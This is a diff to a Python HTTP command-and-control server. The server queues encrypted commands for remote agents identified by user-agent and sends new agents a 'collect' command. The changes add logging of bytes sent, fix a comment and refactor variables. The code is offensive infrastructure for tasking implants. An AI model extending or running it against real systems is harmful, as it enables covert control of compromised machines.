@@ -2,6 +2,7 @@ from server import utils
 
 import os
 import re
+import sys
 import json
 import ntpath
 import threading
@@ -124,7 +125,7 @@ class C2(BaseHTTPRequestHandler):
                 self.parse_agent_data(agent_data)
                 self.update_last_checkin()
                 return
-        # intruder or new agent that didn't collected data as first request - Bye Bye
+        # intruder or new agent that didn't collect data as first request - Bye Bye
         self.close_connection = True
 
     def do_GET(self):
@@ -133,7 +134,10 @@ class C2(BaseHTTPRequestHandler):
 
         if requester == "exists":
             self.send_default_headers_and_status_code()
-            self.wfile.write(utils.encrypt_cbc(json.dumps(agents[self.headers["user-agent"]]["pending_commands"])))
+            encrypted_queue = utils.encrypt_cbc(json.dumps(agents[self.headers["user-agent"]]["pending_commands"]))
+            if len(agents[self.headers["user-agent"]]["pending_commands"]) > 0:
+                utils.log_message(f'Sent {sys.getsizeof(encrypted_queue)} bytes to agent {self.headers["user-agent"]}')
+            self.wfile.write(encrypted_queue)
             agents[self.headers["user-agent"]]["pending_commands"] = []
             self.update_last_checkin()
             return
@@ -145,7 +149,8 @@ class C2(BaseHTTPRequestHandler):
             }
             command = """[{"command_type": "collect"}]"""
             self.send_default_headers_and_status_code()
-            self.wfile.write(utils.encrypt_cbc(command))
+            encrypted_command = utils.encrypt_cbc(command)
+            self.wfile.write(encrypted_command)
 
         else:
             self.close_connection = True
